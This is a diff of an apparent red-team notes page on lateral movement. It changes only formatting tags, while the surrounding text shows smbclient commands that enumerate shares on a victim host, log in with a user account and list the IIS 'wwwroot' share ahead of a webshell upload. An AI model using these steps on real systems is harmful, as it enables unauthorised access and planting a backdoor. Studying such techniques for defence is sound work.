@@ -8,8 +8,7 @@ description: Lateral Movement
 
 Enumerating victim host `10.0.0.6` for any shares:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 smbclient -L //10.0.0.6 -U spot
 
@@ -29,13 +28,11 @@ Enter WORKGROUP\spot's password:
 	transcripts     Disk      
 	wwwroot         Disk      
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Logging in to the `wwwroot` share:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 smbclient //10.0.0.6/wwwroot -U spot
 
@@ -49,8 +46,7 @@ smb: \> ls
   iis-85.png                          A    99710  Tue Jul 31 19:35:48 2018
   iisstart.htm                        A        3  Tue Jul 31 19:38:23 2018
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Uploading a webshell into the `wwwroot`:
 
